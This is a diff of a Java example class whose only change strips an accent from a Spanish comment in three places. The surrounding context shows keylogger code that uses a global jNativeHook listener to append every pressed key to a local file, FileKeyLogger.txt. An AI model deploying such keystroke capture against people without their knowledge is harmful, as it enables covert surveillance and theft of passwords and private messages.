@@ -18,7 +18,7 @@ public class jNativeHookExample implements NativeKeyListener{
         	File archivoKeyLogger = new File("FileKeyLogger.txt");
 			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
 			writeIntegers.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexión
+			//cerramos la conexion
 			writeIntegers.close();
 		} catch (IOException e2) {
 			System.out.println("Error al escribir");
@@ -43,7 +43,7 @@ public class jNativeHookExample implements NativeKeyListener{
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
 			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
 			writeIntegers.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexión
+			//cerramos la conexion
 			writeIntegers.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
@@ -59,7 +59,7 @@ public class jNativeHookExample implements NativeKeyListener{
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
 			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
 			writeIntegers.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexión
+			//cerramos la conexion
 			writeIntegers.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
